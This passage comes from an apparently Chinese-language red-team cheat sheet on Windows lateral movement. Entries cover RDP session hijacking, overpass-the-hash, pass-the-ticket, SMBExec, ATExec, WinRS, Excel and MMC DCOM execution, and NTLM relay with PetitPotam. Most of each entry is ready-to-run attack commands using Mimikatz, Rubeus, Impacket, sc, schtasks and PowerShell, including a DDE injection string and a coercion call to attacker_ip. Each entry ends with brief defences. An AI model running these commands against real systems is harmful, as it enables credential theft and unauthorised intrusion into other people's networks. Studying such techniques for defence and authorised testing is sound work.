**概述：** RDP会话劫持可以接管其他用户的桌面会话。

**漏洞原理：** SYSTEM权限可以连接任意会话。

**利用方法：** 利用流程：1) 获取SYSTEM权限 2) 列出会话 3) 劫持会话

**防御措施：** 防御措施：1) 限制本地登录 2) 监控会话连接 3) 使用锁屏策略

---

### Overpass-the-Hash  `overpass-the-hash`
_使用哈希获取Kerberos票据_
子类：**PtH** · tags: `pth` `kerberos` `hash`

**前置条件：**
- 用户NTLM哈希
- 域环境

**攻击链：**

**Mimikatz**
> 使用哈希获取Kerberos票据
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```
**语法解析：**
- `sekurlsa::pth` — Pass-the-Hash模块 _command_
- `/ntlm:HASH` — 用户NTLM哈希 _parameter_
- `/ptt` — Pass-the-Ticket，注入票据 _parameter_

**Rubeus**
> 使用Rubeus获取票据
_platform: windows_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**Impacket**
> 获取Kerberos票据
_platform: linux_
```
getTGT.py domain.com/user -hashes :HASH
```


**概述：** Overpass-the-Hash使用NTLM哈希获取Kerberos票据。

**漏洞原理：** Kerberos可以使用NTLM哈希获取TGT。

**利用方法：** 利用流程：1) 获取用户哈希 2) 请求Kerberos票据 3) 注入使用

**防御措施：** 防御措施：1) 监控异常票据请求 2) 使用智能卡 3) 限制哈希访问

---

### Pass-the-Ticket  `pass-the-ticket`
_使用Kerberos票据进行横向移动_
子类：**PtT** · tags: `ptt` `kerberos` `ticket`

**前置条件：**
- 有效Kerberos票据

**攻击链：**

**导出票据**
> 从内存导出Kerberos票据
_platform: windows_
```
sekurlsa::tickets /export
```

**注入票据**
> 注入票据到当前会话
_platform: windows_
```
kerberos::ptt ticket.kirbi
```
**语法解析：**
- `kerberos::ptt` — Pass-the-Ticket模块 _command_
- `ticket.kirbi` — Kerberos票据文件 _path_

**Rubeus导入**
> 使用Rubeus注入票据
_platform: windows_
```
Rubeus.exe ptt /ticket:base64ticket
```


**概述：** Kerberos票据可以被提取和重用。

**漏洞原理：** Kerberos票据在有效期内可被重用。

**利用方法：** 利用流程：1) 提取票据 2) 转移票据 3) 注入使用

**防御措施：** 防御措施：1) 缩短票据有效期 2) 监控票据使用 3) 使用PAC验证

---

### SMBExec横向移动  `lateral-smbexec`
_通过SMB执行命令_
子类：**SMB** · tags: `smb` `lateral` `exec`

**前置条件：**
- SMB访问权限
- 管理员权限

**攻击链：**

**Impacket smbexec**
> 使用smbexec执行命令
_platform: linux_
```
smbexec.py domain/user:password@target
```

**通过服务执行**
> 创建并启动服务
_platform: windows_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```
**语法解析：**
- `sc \\target` — 远程服务控制 _domain_
- `create evilsvc` — 创建服务 _keyword_
- `binPath=` — 服务执行路径 _parameter_


**概述：** SMBExec通过SMB创建服务执行命令。

**漏洞原理：** SMB允许远程服务管理。

**利用方法：** 利用流程：1) 连接SMB 2) 创建服务 3) 执行命令

**防御措施：** 防御措施：1) 禁用SMB 2) 限制远程服务创建 3) 监控服务日志

---

### ATExec横向移动  `lateral-atexec`
_通过计划任务执行命令_
子类：**计划任务** · tags: `at` `scheduled` `lateral`

**前置条件：**
- 计划任务权限
- 管理员权限

**攻击链：**

**Impacket atexec**
> 使用atexec执行命令
_platform: linux_
```
atexec.py domain/user:password@target "whoami"
```

**schtasks**
> 创建远程计划任务
_platform: windows_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```
**语法解析：**
- `/s target` — 目标计算机 _parameter_
- `/tn "evil"` — 任务名称 _parameter_
- `/tr` — 任务执行的程序 _parameter_
- `/sc once` — 执行一次 _parameter_


**概述：** ATExec通过计划任务执行命令。

**漏洞原理：** 计划任务允许远程创建和执行。

**利用方法：** 利用流程：1) 连接目标 2) 创建任务 3) 执行命令

**防御措施：** 防御措施：1) 限制远程任务创建 2) 监控任务日志

---

### WinRS横向移动  `lateral-winrs`
_通过WinRS执行远程命令_
子类：**WinRS** · tags: `winrs` `lateral` `windows`

**前置条件：**
- WinRM启用
- 有效凭证

**攻击链：**

**执行命令**
> 远程执行命令
_platform: windows_
```
winrs -r:target -u:user -p:password "whoami"
```
**语法解析：**
- `-r:target` — 远程目标 _parameter_
- `-u:user` — 用户名 _parameter_
- `-p:password` — 密码 _parameter_

**获取Shell**
> 获取远程CMD
_platform: windows_
```
winrs -r:target -u:user -p:password "cmd"
```


**概述：** WinRS是Windows远程Shell工具，基于WinRM。

**漏洞原理：** WinRM启用时可通过WinRS执行命令。

**利用方法：** 利用流程：1) 确认WinRM启用 2) 使用凭证连接 3) 执行命令

**防御措施：** 防御措施：1) 限制WinRM访问 2) 监控WinRM日志

---

### Excel DCOM横向移动  `lateral-dcom-excel`
_利用Excel DCOM进行横向移动_
子类：**DCOM** · tags: `dcom` `excel` `lateral`

**前置条件：**
- 目标安装Excel
- DCOM权限

**攻击链：**

**Excel DCOM激活**
> 激活Excel DCOM对象
_platform: windows_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**执行命令**
> 通过Excel执行命令
_platform: windows_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```
**语法解析：**
- `Excel.Application` — Excel COM对象 _keyword_
- `=CMD|/C` — DDE命令注入 _keyword_

**Impacket DCOM**
> 使用Impacket执行
_platform: linux_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```


**概述：** Excel DCOM可用于远程命令执行。

**漏洞原理：** Excel DCOM对象允许远程访问。

**利用方法：** 利用流程：1) 激活DCOM对象 2) 注入命令 3) 执行

**防御措施：** 防御措施：1) 禁用DCOM 2) 限制远程访问 3) 监控DCOM活动

---

### MMC DCOM横向移动  `lateral-dcom-mmc`
_利用MMC DCOM进行横向移动_
子类：**DCOM** · tags: `dcom` `mmc` `lateral`

**前置条件：**
- 目标安装MMC
- DCOM权限

**攻击链：**

**MMC20.Application**
> 使用MMC执行命令
_platform: windows_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```
**语法解析：**
- `MMC20.Application` — MMC COM对象 _value_
- `ExecuteShellCommand` — 执行Shell命令方法 _function_

**Impacket执行**
> 使用Impacket
_platform: linux_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```


**概述：** MMC DCOM可用于远程命令执行。

**漏洞原理：** MMC DCOM对象允许远程访问。

**利用方法：** 利用流程：1) 激活MMC DCOM 2) 调用ExecuteShellCommand 3) 执行命令

**防御措施：** 防御措施：1) 禁用DCOM 2) 限制远程访问 3) 监控DCOM活动

---

### RDP Relay攻击  `rdp-relay`
_RDP中继攻击技术_
子类：**RDP** · tags: `rdp` `relay` `lateral`

**前置条件：**
- RDP服务可访问
- 存在NTLM认证

**攻击链：**

**设置中继**
> 设置RDP中继服务器
_platform: linux_
```
使用Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
或使用rdp_relay.py
```

**诱导连接**
> 诱导用户连接
```
诱导用户连接到攻击者控制的RDP服务器:
1. 发送恶意RDP文件
2. 用户连接时中继到目标
```

**PetitPotam组合**
> PetitPotam + RDP Relay
_platform: linux_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
结合NTLM中继攻击ADCS
```


**概述：** RDP Relay利用NTLM认证中继攻击。

**漏洞原理：** RDP使用NTLM认证，可被中继。

**利用方法：** 利用流程：1) 设置中继服务器 2) 诱导连接 3) 中继认证

**防御措施：** 防御措施：1) 启用Kerberos 2) 启用CredSSP 3) 网络隔离

---
